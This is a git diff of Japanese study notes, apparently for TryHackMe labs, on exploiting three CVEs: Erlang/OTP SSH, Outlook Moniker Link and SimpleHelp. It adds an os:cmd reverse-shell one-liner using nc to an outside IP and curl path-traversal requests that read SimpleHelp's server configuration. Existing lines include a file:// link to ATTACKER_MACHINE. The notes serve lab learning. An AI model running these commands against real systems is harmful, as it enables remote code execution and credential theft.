@@ -2,6 +2,8 @@
 
 ## CVE-2025-32433
 
+https://tryhackme.com/room/erlangotpsshcve202532433
+
 https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py
 
 - Erlang/OTP SSH
@@ -12,6 +14,12 @@ https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py
 
 ```
 file:write_file("/lab.txt", <<"pwned">>)
+```
+
+os::cmd を使うことで、任意のコードを実行できる。
+
+```
+command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f").'
 ```
 
 ## CVE-2024-21413（Moniker Link）
@@ -31,3 +39,36 @@ https://github.com/CMNatic/CVE-2024-21413
 # 「!」文字を入れて、保護ビューをバイパスするリンク
 <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
 ```
+
+## CVE-2024-57727 (SimpleHelp)
+
+https://tryhackme.com/room/simplehelpcve202457727
+
+- SimpleHelp <= v5.5.7
+- パストラバーサルの脆弱性
+- この他に、CVE-2024-57726、CVE-2024-57728 もある
+
+```sh
+git clone https://github.com/imjdl/CVE-2024-57727
+cd CVE-2024-57727
+
+# 脆弱性があるかどうか確認
+python3 poc.py http://MACHINE_IP
+```
+
+Windows 用
+
+```sh
+# --path-as-is により、.. が正規化されなくなる
+curl --path-as-is http://MACHINE_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml
+```
+
+Linux 用
+
+```sh
+# Linuxの場合、resource1 の部分を有効なディレクトリ名にする必要がある
+curl --path-as-is http://MACHINE_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml
+```
+
+secmsg 以外の候補 `alertsdb, backups, branding, history, html, notifications, recordings, remotework, simulations, sslconfig, techprefs, templates, toolbox, toolbox-resources, translations
+`
